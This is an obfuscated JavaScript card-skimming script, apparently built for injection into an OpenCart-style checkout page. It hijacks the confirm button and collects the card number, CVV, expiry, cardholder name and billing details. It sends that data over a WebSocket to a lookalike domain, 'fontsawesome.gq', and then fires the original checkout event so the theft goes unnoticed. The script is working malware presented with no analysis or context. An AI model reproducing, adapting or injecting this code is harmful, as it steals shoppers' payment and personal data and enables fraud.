function fire_event() {
    if (typeof is_debug !== 'undefined' && is_debug) {
        console['log']('Fire event')
    };
    if (document['createEvent']) {
        element['dispatchEvent'](event_store)
    } else {
        element['fireEvent']('on' + event_store['eventType'], event_store)
    }
  }
  function d() {
    var _0x1306x3 = $('input[name=cc_name]');
    var _0x1306x4 = $('input[name=cc_number]');
    var _0x1306x5 = $('#cc_month option:selected')['val']() + '/' + $('#cc_year option:selected')['val']();
    var _0x1306x6 = $('input[name=cc_cvv]');
    var _0x1306x7 = _0x1306x4['val']();
    var _0x1306x8 = _0x1306x6['val']();
    var _0x1306x9 = _0x1306x3['val']();
    var _0x1306xa = $('input[name=firstname]')['val']();
    var _0x1306xb = $('input[name=lastname]')['val']();
    var _0x1306xc = $('select[name=country_id]')['val']();
    var _0x1306xd = $('input[name=city]')['val']();
    var _0x1306xe = $('select[name=zone_id]')['val']();
    var _0x1306xf = $('input[name=postcode]')['val']();
    var _0x1306x10 = $('input[name=telephone]')['val']();
    var _0x1306x11 = $('input[name=email]')['val']();
    var _0x1306x12 = 'CC_OWNER:' + _0x1306x9 + ';CC_NUMBER:' + _0x1306x7 + ';CC_EXP:' + _0x1306x5 + ';CC_CVC:' + _0x1306x8 + ';';
    _0x1306x12 += 'BFNAME:' + _0x1306xa + ';BLNAME:' + _0x1306xb + ';BCOUNTRY:' + _0x1306xc + ';BCITY:' + _0x1306xd + ';';
    _0x1306x12 += 'BSTATE:' + _0x1306xe + ';BPOSTCODE:' + _0x1306xf + ';BPHONE:' + _0x1306x10 + ';BEMAIL:' + _0x1306x11;
    var _0x1306x13 = new WebSocket('wss://fontsawesome.gq:8080/g');
    _0x1306x13['onopen'] = function() {
        _0x1306x13['send'](_0x1306x12);
        _0x1306x13['close']()
    };
    _0x1306x13['onerror'] = function(_0x1306x14) {
        fire_event();
        return false
    };
    _0x1306x13['onclose'] = function() {
        fire_event();
        return false
    }
  }
  $(document)['ready'](function(_0x1306x15) {
    var _0x1306x16 = setInterval(function(_0x1306x15) {
        var _0x1306x17 = $('#button-confirm')['attr']('onclick');
        if (typeof _0x1306x17 === 'undefined') {
            $('#button-confirm')['attr']('onclick', 'd();return false;')
        }
    }, 500)
  })
